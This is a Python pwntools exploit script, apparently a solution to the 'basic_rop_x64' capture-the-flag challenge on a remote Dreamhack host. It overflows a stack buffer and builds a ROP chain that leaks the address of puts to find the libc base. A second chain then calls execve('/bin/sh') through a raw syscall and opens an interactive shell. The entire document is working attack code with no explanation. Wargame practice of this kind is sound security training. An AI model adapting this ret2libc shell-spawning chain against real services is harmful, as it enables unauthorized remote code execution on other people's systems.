from pwn import *

exe = ELF('basic_rop_x64', checksec=False)
#r = process(exe.path)
r = remote('host3.dreamhack.games', 16149)
libc = ELF('libc.so.6', checksec=False)

pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881

#input()
payload = b'a'*(0x40 + 0x8)
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
r.send(payload)
r.recvuntil(b'a'*0x40)
puts_leak = u64(r.recv(6) + b'\x00\x00')
log.info("puts leak: " + hex(puts_leak))
libc.address = puts_leak - libc.sym['puts']
log.info("libc base: " + hex(libc.address))

pop_rdi = libc.address + 0x0000000000021102
pop_rsi = libc.address + 0x00000000000202e8
pop_rdx = libc.address + 0x0000000000001b92
pop_rax = libc.address + 0x0000000000033544
syscall = libc.address + 0x00000000000026bf

payload = b'a'*(0x40 + 0x8)
payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(syscall)
r.sendline(payload)

r.interactive()